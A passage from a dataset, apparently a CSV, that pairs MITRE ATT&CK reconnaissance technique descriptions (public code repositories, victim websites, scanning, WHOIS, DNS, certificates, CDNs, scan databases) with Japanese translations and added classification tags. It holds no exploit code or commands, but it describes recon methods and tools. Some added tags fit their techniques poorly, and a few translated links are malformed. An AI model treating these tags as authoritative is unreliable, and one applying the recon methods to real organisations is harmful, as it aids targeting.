repositories.",攻撃者は、標的選定時に利用可能な被害者情報を公開コードリポジトリから探索する可能性がある。被害者はGitHub、GitLab、SourceForge、BitBucketなどの各種サードパーティWebサイト上のリポジトリにコードを保存している場合がある。 ユーザーは通常、Webアプリケーションやgitなどのコマンドラインユーティリティを通じてコードリポジトリを操作します。攻撃者は様々な公開コードリポジトリから被害者に関する情報を収集します。公開コードリポジトリは、一般的に使用されるプログラミング言語やライブラリ、従業員名など、被害者に関する様々な一般情報の情報源となることがよくあります。攻撃者は、誤って漏洩した認証情報やAPIキーなど、より機密性の高いデータも特定する可能性があります。(引用: GitHub Cloud Service Credentials) これらの情報源から得られた情報は、他の偵察手法（例: [情報フィッシング](https://attack.mitre.org/techniques/T1598)）や運用リソースの確立（例: [アカウント侵害](https://attack.mitre.org/techniques/T1586) または [インフラの侵害](https://attack.mitre.org/techniques/T1584))、および／または初期アクセス（例：[有効なアカウント](https://attack.mitre.org/techniques/T1078) や [フィッシング](https://attack.mitre.org/techniques/T1566)）の機会を明らかにする可能性があります。 **注記：**これは、プライベートおよび内部でホストされているコードリポジトリからの[収集](https://attack.mitre.org/tactics/TA0009)に焦点を当てる[コードリポジトリ](https://attack.mitre.org/techniques/T1213/003)とは異なります。,reconnaissance,PRE,credential_abuse,unknown,authentication_system;user_interaction;endpoint_execution;cloud_control_plane,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--70910fbd-58dc-4c1c-8c48-814d11fcd022,2022-08-09T13:01:43.314Z,2025-04-15T22:04:43.188Z,,,,
T1594,,Search Victim-Owned Websites,被害者所有のウェブサイトを検索する,"Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: [Email Addresses](https://attack.mitre.org/techniques/T1589/002)). These sites may also have details highlighting business operations and relationships.(Citation: Comparitech Leak) Adversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199) or [Phishing](https://attack.mitre.org/techniques/T1566)). In addition to manually browsing the website, adversaries may attempt to identify hidden directories or files that could contain additional sensitive information or vulnerable functionality. They may do this through automated activities such as [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003), as well as by leveraging files such as sitemap.xml and robots.txt.(Citation: Perez Sitemap XML 2023)(Citation: Register Robots TXT 2015)",攻撃者は標的選定時に利用可能な情報を求めて被害者が所有するウェブサイトを検索する可能性がある。被害者所有のウェブサイトには、部署名・部門名、物理的な所在地、主要従業員に関する情報（氏名、役職、連絡先情報など）が含まれる場合がある（例：[メールアドレス](https://attack.mitre.org/techniques/T1589/002)）。 これらのサイトには、事業運営や関係性を示す詳細情報も掲載されている場合があります（出典：Comparitech Leak）。攻撃者は、実行可能な情報を収集するために被害者所有のウェブサイトを検索する可能性があります。 これらの情報源から得られる情報は、他の形態の偵察（例：[情報フィッシング](https://attack.mitre.org/techniques/T1598) や [公開技術データベースの検索](https://attack.mitre.org/techniques/T1596)）の機会を明らかにし、運用リソースを確立する可能性があります。 （例：[アカウントの確立](https://attack.mitre.org/techniques/T1585) または [アカウントの侵害](https://attack.mitre.org/techniques/T1586)）、および／または初期アクセス （例：[信頼関係](https://attack.mitre.org/techniques/T1199) または [フィッシング](https://attack.mitre.org/techniques/T1566)）。ウェブサイトを手動で閲覧する以外に、攻撃者は追加の機密情報や脆弱な機能を含む可能性のある隠しディレクトリやファイルを特定しようとする場合があります。 これらは、[ワードリストスキャン](https://attack.mitre.org/techniques/T1595/003) などの自動化された活動や、sitemap.xml や robots.txt などのファイルを活用することで行われる可能性があります。(引用: Perez Sitemap XML 2023)(引用: Register Robots TXT 2015),reconnaissance,PRE,discovery_enumeration,unknown,user_interaction;email_infrastructure;cloud_control_plane;file_storage_access;database_access,specified,Mail / Collaboration,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--16cdd21f-da65-4e4f-bc04-dd7d198c7b26,2020-10-02T16:51:50.306Z,2025-04-15T23:04:36.505Z,,,,
T1595,,Active Scanning,アクティブスキャン,"Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction. Adversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.(Citation: Botnet Scan)(Citation: OWASP Fingerprinting) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",攻撃者は標的選定時に活用可能な情報を収集するため、能動的偵察スキャンを実行する可能性があります。能動的スキャンとは、直接的な相互作用を伴わない他の偵察手法とは異なり、攻撃者がネットワークトラフィックを介して被害者インフラを調査する手法です。攻撃者は収集対象情報に応じて異なる形態の能動的スキャンを実施します。これらのスキャンは、ICMPなどのネットワークプロトコルのネイティブ機能を利用するなど、様々な方法で実行される可能性があります。（引用元： ボットネットスキャン)(引用元: OWASPフィンガープリンティング) これらのスキャンから得られた情報は、他の偵察手法（例: [公開ウェブサイトの検索/ドメイン検索](https://attack.mitre.org/techniques/T1593) や [公開技術データベースの検索](https://attack.mitre.org/techniques/T1596)）の機会を明らかにし、運用リソースの確立につながる可能性がある （例：[能力開発](https://attack.mitre.org/techniques/T1587) または [能力取得](https://attack.mitre.org/techniques/T1588)）、および／または初期アクセス （例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133) または [公開アプリケーションの悪用](https://attack.mitre.org/techniques/T1190)）。,reconnaissance,PRE,remote_service_abuse,unknown,endpoint_execution;network_connectivity;database_access,specified,Unknown,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--67073dde-d720-45ae-83da-b12d5e73ca3b,2020-10-02T16:53:16.526Z,2025-04-15T21:44:26.959Z,,,,
T1595.001,T1595,Scanning IP Blocks,IPブロックのスキャン,"Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Adversaries may scan IP blocks in order to [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590), such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.(Citation: Botnet Scan) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",攻撃者は標的選定時に利用可能な情報を収集するため、被害者IPブロックをスキャンする可能性がある。パブリックIPアドレスは組織に対してブロック単位、または連続したアドレス範囲で割り当てられる。 攻撃者は、[被害者ネットワーク情報の収集](https://attack.mitre.org/techniques/T1590)を目的としてIPブロックをスキャンする場合があります。これには、実際に使用中のIPアドレスや、それらのアドレスが割り当てられたホストに関する詳細情報が含まれます。スキャンは単純なping（ICMP要求と応答）から、サーバーバナーやその他のネットワークアーティファクトを通じてホストのソフトウェア/バージョンを明らかにするより精緻なスキャンまで多岐にわたります。(引用: Botnet Scan) これらのスキャンから得られた情報は、他の偵察手法（例: [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593) や [公開技術データベースの検索](https://attack.mitre.org/techniques/T1596)）の機会を明らかにし、運用リソースの確立（例: [能力開発](https://attack.mitre.org/techniques/T1587) または [能力取得](https://attack.mitre.org/techniques/T1588))、および/または初期アクセス（例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133)）の確立につながる可能性があります。,reconnaissance,PRE,remote_service_abuse,unknown,network_connectivity;database_access,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--db8f5003-3b20-48f0-9b76-123e44208120,2020-10-02T16:54:23.193Z,2025-04-15T23:02:44.660Z,,,,
T1595.002,T1595,Vulnerability Scanning,脆弱性スキャン,"Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use. These scans may also include more broad attempts to [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592) that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.(Citation: OWASP Vuln Scanning) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",攻撃者は標的選定時に利用可能な脆弱性を被害者システムでスキャンする場合がある。脆弱性スキャンは通常、標的ホスト／アプリケーションの設定（例：ソフトウェアとバージョン）が、攻撃者が使用しようとする特定のエクスプロイトの標的と潜在的に一致するかどうかを確認する。 これらのスキャンには、より広く[被害者ホスト情報の収集](https://attack.mitre.org/techniques/T1592)を試みるものも含まれ、より一般的に知られている悪用可能な脆弱性を特定するために使用される可能性があります。脆弱性スキャンは通常、サーバーバナー、リスニングポート、その他のネットワークアーティファクトを介して、実行中のソフトウェアとバージョン番号を収集します。（引用元：OWASP Vuln Scanning） これらのスキャンから得られた情報は、他の形態の偵察（例：[公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593) や [公開技術データベースの検索](https://attack.mitre.org/techniques/T1596)）、運用リソースの確立（例：[能力開発]((https://attack.mitre.org/techniques/T1587) または [能力の取得](https://attack.mitre.org/techniques/T1588))、および/または初期アクセス（例：[公開アプリケーションの悪用](https://attack.mitre.org/techniques/T1190)）の機会を明らかにする可能性があります。,reconnaissance,PRE,config_policy_manipulation,unknown,network_connectivity;database_access,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--5502c4e9-24ef-4d5f-8ee9-9e906c2f82c4,2020-10-02T16:55:16.047Z,2025-04-15T23:19:33.981Z,,,,
T1595.003,T1595,Wordlist Scanning,ワードリストスキャン,"Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to [Brute Force](https://attack.mitre.org/techniques/T1110), its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591), or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). For example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website’s pages and directories.(Citation: ClearSky Lebanese Cedar Jan 2021) This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [Brute Force](https://attack.mitre.org/techniques/T1110)). As cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure.(Citation: S3Recon GitHub)(Citation: GCPBucketBrute) Once storage objects are discovered, adversaries may leverage [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530) to access valuable information that can be exfiltrated or used to escalate privileges and move laterally.",攻撃者は、ブルートフォースやクローリング技術を用いてインフラを反復的に探査することがあります。この手法は[ブルートフォース](https://attack.mitre.org/techniques/T1110)と類似した方法を用いますが、その目的は有効な認証情報の発見ではなく、コンテンツやインフラの特定にあります。これらのスキャンで使用されるワードリストには、汎用的で一般的に使用される名前やファイル拡張子、あるいは特定のソフトウェア固有の用語が含まれる場合があります。 攻撃者は、他の偵察技術（例：[被害組織情報の収集](https://attack.mitre.org/techniques/T1591) や [被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）から収集したデータを用いて、ターゲット固有のカスタムワードリストを作成することもある。 例えば、攻撃者は Dirb、DirBuster、GoBuster などの Web コンテンツ発見ツールと汎用またはカスタムの単語リストを使用して、Web サイトのページやディレクトリを列挙することがあります（引用元：ClearSky Lebanese Cedar Jan 2021）。 これにより、攻撃者は古い脆弱なページや隠された管理ポータルを発見し、さらなる攻撃の標的とすることが可能になります（例：[公開アプリケーションの悪用](https://attack.mitre.org/techniques/T1190) や [ブルートフォース攻撃](https://attack.mitre.org/techniques/T1110)）。 クラウドストレージソリューションは通常、グローバルに一意の名前を使用するため、攻撃者はターゲット固有の単語リストやs3recon、GCPBucketBruteなどのツールを使用して、クラウドインフラストラクチャ上の公開および非公開バケットを列挙することもあります。(引用元: S3Recon GitHub)(引用元: GCPBucketBrute)ストレージオブジェクトが発見されると、攻撃者は[クラウドストレージからのデータ](https://attack.mitre.org/techniques/T1530)を活用して、漏洩させたり、特権昇格や横方向の移動に使用できる貴重な情報にアクセスする可能性があります。,reconnaissance,PRE,credential_abuse,unknown,authentication_system;network_connectivity;cloud_control_plane;file_storage_access,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--bed04f7d-e48a-4e76-bd0f-4c57fe31fc46,2022-03-04T18:56:38.844Z,2025-04-15T23:22:19.165Z,,,,
T1596,,Search Open Technical Databases,公開技術データベースの検索,"Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS)(Citation: Medium SSL Cert)(Citation: SSLShopper Lookup)(Citation: DigitalShadows CDN)(Citation: Shodan) Adversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",攻撃者は、標的選定時に利用可能な被害者情報を、自由にアクセス可能な技術データベースから検索する可能性があります。被害者情報は、ドメイン/証明書の登録情報や、トラフィックやスキャンから収集されたネットワークデータ/アーティファクトの公開コレクションなど、オンラインデータベースやリポジトリに存在する場合があります。(引用: WHOIS)(引用: DNS Dumpster)(引用: Circl Passive DNS)(引用: Medium SSL Cert)(引用: SSLShopper Lookup)(引用: DigitalShadows CDN)(引用: Shodan)敵対者は、収集しようとする情報に応じて、さまざまな公開データベースを検索する場合があります。 これらの情報源から得られた情報は、他の形態の偵察（例：[情報フィッシング](https://attack.mitre.org/techniques/T1598) や [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）の機会を明らかにし、運用リソースを確立する可能性があります。 （例：[インフラの取得](https://attack.mitre.org/techniques/T1583) または [インフラの侵害](https://attack.mitre.org/techniques/T1584)）、および／または初期アクセス （例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133) または [信頼関係](https://attack.mitre.org/techniques/T1199)）。,reconnaissance,PRE,remote_service_abuse,unknown,user_interaction;network_connectivity;database_access,specified,Unknown,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--55fc4df0-b42c-479a-b860-7a6761bcaad0,2020-10-02T16:56:05.810Z,2025-04-15T23:04:02.249Z,,,,
T1596.001,T1596,DNS/Passive DNS,DNS/パッシブDNS,"Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts. Adversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",攻撃者は、標的選定時に利用可能な被害者情報をDNSデータから検索する可能性がある。DNS情報には、登録済みネームサーバーや、標的のサブドメイン、メールサーバー、その他のホストのアドレス構成を示すレコードなど、様々な詳細が含まれる。 攻撃者は、実行可能な情報を収集するために DNS データを検索する場合があります。脅威アクターは、標的組織のネームサーバーを直接照会したり、ログ記録された DNS クエリ応答の集中型リポジトリ（パッシブ DNS として知られる）を検索したりできます。(引用: DNS Dumpster)(引用: Circl Passive DNS) 攻撃者はまた、内部ネットワークに関する情報を明らかにする DNS の設定ミスや情報漏えいを探して標的にする場合もあります。 これらの情報源から得られる情報は、他の偵察手法（例：[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594) や [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）の機会を明らかにし、運用リソースの確立につながる可能性があります （例：[インフラの取得](https://attack.mitre.org/techniques/T1583) または [インフラの侵害](https://attack.mitre.org/techniques/T1584)）、および／または初期アクセス （例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133) または [信頼関係](https://attack.mitre.org/techniques/T1199)）。,reconnaissance,PRE,remote_service_abuse,unknown,authentication_system;network_connectivity;logging_monitoring,specified,Log / Monitoring Server,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--17fd695c-b88c-455a-a3d1-43b6cb728532,2020-10-02T16:57:45.044Z,2025-04-15T22:14:34.882Z,,,,
T1596.002,T1596,WHOIS,WHOIS,"Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.(Citation: WHOIS) Adversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",敵対者は、標的選定時に利用可能な被害者情報を得るため、公開WHOISデータを検索する可能性がある。WHOISデータは、ドメイン名などのインターネット資源の割り当て・割り振りを担当する地域インターネットレジストリ（RIR）によって保管される。 誰でもWHOISサーバーにクエリを送信し、登録ドメインに関する情報（割り当てられたIPブロック、連絡先情報、DNSネームサーバーなど）を取得できます（出典: WHOIS）。攻撃者は実行可能な情報を収集するためにWHOISデータを検索する可能性があります。脅威アクターはオンラインリソースやコマンドラインユーティリティを使用して、潜在的な被害者に関する情報をWHOISデータから収集できます。 これらの情報源から得られるデータは、他の偵察手法（例：[アクティブスキャン](https://attack.mitre.org/techniques/T1595) や [情報フィッシング](https://attack.mitre.org/techniques/T1598)）の機会を明らかにし、運用リソースの確立につながる可能性があります （例：[インフラ取得](https://attack.mitre.org/techniques/T1583) または [インフラ侵害](https://attack.mitre.org/techniques/T1584)）、および／または初期アクセス （例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133) または [信頼関係](https://attack.mitre.org/techniques/T1199)）。,reconnaissance,PRE,remote_service_abuse,unknown,user_interaction;endpoint_execution;network_connectivity,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--166de1c6-2814-4fe5-8438-4e80f76b169f,2020-10-02T16:56:49.744Z,2025-04-15T23:20:02.082Z,,,,
T1596.003,T1596,Digital Certificates,デジタル証明書,"Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location. Adversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.(Citation: SSLShopper Lookup) Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).(Citation: Medium SSL Cert) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",攻撃者は標的選定時に利用可能な被害者情報を得るため、公開デジタル証明書データを検索する可能性がある。デジタル証明書は署名済みコンテンツの起源を暗号的に検証するため、認証局（CA）によって発行される。暗号化ウェブ通信（HTTPS SSL/TLS通信）などに使用されるこれらの証明書には、登録組織名や所在地などの情報が含まれる。 攻撃者は、実行可能な情報を収集するためにデジタル証明書データを検索する可能性がある。脅威アクターは、オンラインリソースや検索ツールを使用して証明書に関する情報を収集できる（引用元：SSLShopper Lookup）。デジタル証明書データは、組織によって署名されたアーティファクトからも入手可能である（例：暗号化されたWebトラフィックで使用される証明書はコンテンツと共に提供される）。(引用元: Medium SSL Cert) これらの情報源から得られるデータは、他の偵察手法（例: [アクティブスキャン](https://attack.mitre.org/techniques/T1595) や [情報フィッシング](https://attack.mitre.org/techniques/T1598)）の機会を明らかにし、運用リソースの確立につながる可能性があります。 （例：[能力開発](https://attack.mitre.org/techniques/T1587) または [能力取得](https://attack.mitre.org/techniques/T1588)）、および／または初期アクセス （例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133) または [信頼関係](https://attack.mitre.org/techniques/T1199)）。,reconnaissance,PRE,remote_service_abuse,unknown,user_interaction;network_connectivity,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--0979abf9-4e26-43ec-9b6e-54efc4e70fca,2020-10-02T16:58:58.738Z,2025-04-15T22:18:01.430Z,,,,
T1596.004,T1596,CDNs,CDN,"Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor’s geographical region. Adversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization’s website.(Citation: DigitalShadows CDN) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)).",攻撃者は、標的選定時に利用可能な被害者に関するコンテンツ配信ネットワーク（CDN）データを検索する可能性がある。CDNは、分散型で負荷分散されたサーバー群からコンテンツをホストすることを組織に可能にする。CDNはまた、要求元の地理的地域に基づいてコンテンツ配信をカスタマイズすることを組織に可能にする場合がある。 攻撃者はCDNデータを検索し、実用的な情報を収集する可能性があります。脅威アクターはオンラインリソースや検索ツールを活用し、CDN内のコンテンツサーバーに関する情報を収集できます。攻撃者はまた、意図せず公開された機密情報を漏洩させるCDNの設定ミスや、組織のウェブサイトでホストされているコンテンツと同等の保護メカニズム（例：ログインポータル）を持たないCDN設定を標的とする可能性があります。(引用元: DigitalShadows CDN) これらの情報源から得られる知見は、他の偵察手法（例: [アクティブスキャン](https://attack.mitre.org/techniques/T1595) や [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）の機会を明らかにし、運用リソースの確立（例: [インフラ取得]((https://attack.mitre.org/techniques/T1583) や [インフラの侵害](https://attack.mitre.org/techniques/T1584))、および／または初期アクセス（例：[ドライブバイ侵害](https://attack.mitre.org/techniques/T1189)）の機会を明らかにする可能性があります。,reconnaissance,PRE,config_policy_manipulation,unknown,authentication_system;user_interaction;network_connectivity;logging_monitoring,specified,Log / Monitoring Server,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--91177e6d-b616-4a03-ba4b-f3b32f7dda75,2020-10-02T16:59:56.648Z,2025-04-15T21:55:21.053Z,,,,
T1596.005,T1596,Scan Databases,データベースのスキャン,"Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.(Citation: Shodan) Adversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",攻撃者は、標的選定時に利用可能な被害者情報を公開スキャンデータベース内で検索することがある。 様々なオンラインサービスは、インターネットスキャン/調査の結果を継続的に公開しており、稼働中のIPアドレス、ホスト名、開放ポート、証明書、さらにはサーバーバナーなどの情報を収集することが多い。（引用元: Shodan）攻撃者はスキャンデータベースを検索して実用的な情報を収集する可能性がある。脅威アクターはオンラインリソースや検索ツールを利用して、これらのサービスから情報を収集できる。攻撃者は既に特定した標的に関する情報を求めるか、これらのデータセットを利用して侵入成功の機会を発見する可能性がある。 これらの情報源から得られる情報は、他の偵察手法（例：[アクティブスキャン](https://attack.mitre.org/techniques/T1595) や [公開ウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）の機会を明らかにし、運用リソースの確立に寄与する可能性があります。 （例：[能力開発](https://attack.mitre.org/techniques/T1587) または [能力取得](https://attack.mitre.org/techniques/T1588)）、および／または初期アクセス （例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133) または [公開アプリケーションの悪用](https://attack.mitre.org/techniques/T1190)）。,reconnaissance,PRE,remote_service_abuse,unknown,network_connectivity;database_access,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--ec4be82f-940c-4dcb-87fe-2bbdd17c692f,2020-10-02T17:00:44.586Z,2025-04-15T23:02:32.145Z,,,,
T1597,,Search Closed Sources,クローズドソースの検索,"Adversaries may search and gather information about victims from closed (e.g., paid, private, or otherwise not freely available) sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.(Citation: ZDNET Selling Data) Adversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",敵対者は、標的選定時に利用可能なクローズドソース（例：有料、非公開、またはその他の方法で自由に利用できないソース）から被害者に関する情報を検索・収集する可能性がある。 被害者に関する情報は、技術/脅威インテリジェンスデータのフィードへの有料購読など、信頼できる民間情報源やデータベースから購入できる場合があります。また、ダークウェブやサイバー犯罪の闇市場など、信頼性の低い情報源から情報を購入することもあります（引用元：ZDNET Selling Data）。敵対者は、収集しようとする情報に応じて、さまざまなクローズドデータベースを検索する場合があります。 